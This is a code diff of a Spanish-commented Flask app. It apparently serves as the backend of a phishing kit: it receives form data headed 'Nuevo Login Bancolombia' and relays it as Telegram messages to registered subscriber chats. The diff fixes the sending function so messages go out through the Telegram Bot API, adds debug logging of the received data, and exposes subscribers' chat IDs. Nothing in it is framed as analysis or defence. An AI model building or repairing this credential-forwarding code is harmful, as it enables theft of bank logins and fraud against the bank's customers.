@@ -1,13 +1,13 @@
-# app.py - VERSIÓN CORREGIDA
+# app.py - VERSIÓN FINAL CORREGIDA
 from telegram import Update, Bot
 from flask import Flask, request, jsonify
 from flask_sqlalchemy import SQLAlchemy
 from flask_cors import CORS
 import os
-import asyncio
+import requests
 
 # Variables de entorno
-TOKEN_BOT = os.getenv('TELEGRAM_TOKEN')
+TOKEN_BOT = os.getenv('TELEGRAM_TOKEN', '').strip()
 if not TOKEN_BOT:
     raise ValueError("TELEGRAM_TOKEN no configurado")
 
@@ -36,15 +36,25 @@ class Suscriptor(db.Model):
 with app.app_context():
     db.create_all()
 
-# Función helper para enviar mensajes de forma síncrona
+# Función helper para enviar mensajes
 def send_telegram_message(chat_id, text, parse_mode=None):
-    """Envía mensaje a Telegram de forma síncrona"""
+    """Envía mensaje a Telegram usando requests"""
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode))
-        loop.close()
-        return True
+        url = f'https://api.telegram.org/bot{TOKEN_BOT}/sendMessage'
+        payload = {
+            'chat_id': chat_id,
+            'text': text
+        }
+        if parse_mode:
+            payload['parse_mode'] = parse_mode
+        
+        response = requests.post(url, json=payload, timeout=10)
+        result = response.json()
+        if result.get('ok'):
+            return True
+        else:
+            print(f"Error Telegram API: {result}")
+            return False
     except Exception as e:
         print(f"Error enviando mensaje: {e}")
         return False
@@ -112,6 +122,7 @@ def enviar_a_suscriptores():
     """Recibe datos del formulario y los envía a suscriptores"""
     try:
         data = request.json
+        print(f"Datos recibidos: {data}")  # Debug
         
         mensaje = f"""
 🔐 *Nuevo Login Bancolombia*
@@ -124,11 +135,16 @@ def enviar_a_suscriptores():
         """
         
         suscriptores = Suscriptor.query.filter_by(activo=True).all()
-        enviados = 0
+        print(f"Suscriptores activos: {len(suscriptores)}")  # Debug
         
+        enviados = 0
         for suscriptor in suscriptores:
+            print(f"Enviando a: {suscriptor.chat_id}")  # Debug
             if send_telegram_message(suscriptor.chat_id, mensaje, parse_mode='Markdown'):
                 enviados += 1
+                print(f"✓ Enviado a {suscriptor.chat_id}")
+            else:
+                print(f"✗ Falló envío a {suscriptor.chat_id}")
         
         return jsonify({
             'success': True,
@@ -137,6 +153,8 @@ def enviar_a_suscriptores():
         })
     except Exception as e:
         print(f"Error en /api/enviar: {e}")
+        import traceback
+        traceback.print_exc()
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/suscriptores', methods=['GET'])
@@ -145,7 +163,7 @@ def listar_suscriptores():
     suscriptores = Suscriptor.query.filter_by(activo=True).all()
     return jsonify({
         'total': len(suscriptores),
-        'suscriptores': [{'username': s.username, 'nombre': s.nombre} for s in suscriptores]
+        'suscriptores': [{'username': s.username, 'nombre': s.nombre, 'chat_id': s.chat_id} for s in suscriptores]
     })
 
 @app.route('/')
